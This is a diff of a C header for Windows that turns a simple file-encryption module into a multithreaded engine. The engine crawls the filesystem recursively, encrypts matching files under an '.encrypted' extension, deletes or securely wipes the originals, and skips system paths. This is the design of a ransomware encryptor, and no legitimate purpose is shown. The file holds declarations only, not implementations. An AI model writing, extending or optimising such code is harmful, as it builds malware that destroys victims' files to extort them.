@@ -1,19 +1,92 @@
-#pragma once
+#ifndef FILEOPS_H
+#define FILEOPS_H
+
 #include <windows.h>
+#include <stdbool.h>
 
-#define ENC_EXT       ".encrypted"
-#define ENC_EXT_LEN   10
-#define MAX_FPATH     (MAX_PATH * 2)
-#define MAX_DEPTH     32
+/* Cryptographic constants come from crypto.h */
+#include "crypto.h"
 
-/* Encrypt a single file at `path` — overwrites with IV + ciphertext */
-void EncryptSingleFile(const char *path);
+/* ============================================================
+ * CONFIGURATION & CONSTANTS
+ * ============================================================ */
 
-/* Recursively walk `dir` and encrypt all target files */
-void EncryptDirectory(const char *dir, int depth);
+#define FILEOPS_MAX_PATH     32768   // Support for \\?\ extended paths
+#define FILEOPS_DEFAULT_THREADS 8    // Optimal for modern multi-core I/O
+#define FILEOPS_IO_CHUNK    (64*1024) // 64KB aligns with NTFS cluster sizes
 
-/* Returns 1 if path matches a target extension */
-int IsTargetExtension(const char *path);
+/* Fileops-specific constants (not crypto-related) */
+#define ENC_EXT           ".encrypted"
+#define ENC_EXT_LEN       10
+#define MAX_FPATH         32768
+#define MAX_DEPTH         16
 
-/* Returns 1 if path is in a system/skip directory */
-int ShouldSkipPath(const char *fullPath);
+typedef enum {
+    FILEOPS_FLAG_NONE          = 0,
+    FILEOPS_FLAG_RECURSIVE     = 1 << 0,
+    FILEOPS_FLAG_DRY_RUN       = 1 << 1, // Log only, do not encrypt
+    FILEOPS_FLAG_NO_DELETE     = 1 << 2, // Keep original files
+    FILEOPS_FLAG_SECURE_DELETE = 1 << 3, // 3-pass wipe before unlink
+    FILEOPS_FLAG_FOLLOW_SYMLINKS = 1 << 4
+} FILEOPS_FLAGS;
+
+/* ============================================================
+ * CORE STRUCTURES (Context & Stats)
+ * ============================================================ */
+
+typedef struct {
+    alignas(8) volatile LONGLONG bytesProcessed;
+    alignas(8) volatile LONGLONG filesSucceeded;
+    alignas(8) volatile LONGLONG filesFailed;
+    DWORD lastSystemError;
+    FILETIME startTime;
+} FILEOPS_STATS;
+
+typedef struct {
+    WCHAR extension[16];
+    DWORD threadCount;
+    DWORD ioBufferSize;
+    FILEOPS_FLAGS flags;
+    // Callback for custom skip logic
+    bool (*pfnShouldSkip)(const WCHAR* path); 
+} FILEOPS_CONFIG;
+
+// Opaque context handle to prevent global state leaks
+typedef struct FILEOPS_CTX FILEOPS_CTX;
+
+/* ============================================================
+ * HIGH-PERFORMANCE API
+ * ============================================================ */
+
+/**
+ * LIFECYCLE: Initializes a heavy-duty processing context.
+ * Spawns the internal thread pool and prepares I/O completion ports.
+ */
+FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config);
+
+/**
+ * DISCOVERY: Recursively crawls the filesystem.
+ * Submits discovered files to the internal high-speed work queue.
+ */
+void FileOps_TraverseAndQueue(FILEOPS_CTX* ctx, const WCHAR* rootPath);
+
+/**
+ * INDIVIDUAL: Direct encryption of a single target.
+ * Useful for targeted operations bypassing the crawler.
+ */
+bool FileOps_ProcessSingleFile(FILEOPS_CTX* ctx, const WCHAR* filePath);
+/**
+ * SYNCHRONIZATION: Blocks until all queued file operations are complete.
+ */
+void FileOps_WaitForCompletion(FILEOPS_CTX* ctx);
+
+/**
+ * TELEMETRY: Returns an immutable snapshot of current engine performance.
+ */
+void FileOps_GetStats(FILEOPS_CTX* ctx, FILEOPS_STATS* outStats);
+/**
+ * CLEANUP: Shuts down threads and frees the context.
+ */
+void FileOps_DestroyContext(FILEOPS_CTX* ctx);
+
+#endif // FILEOPS_H
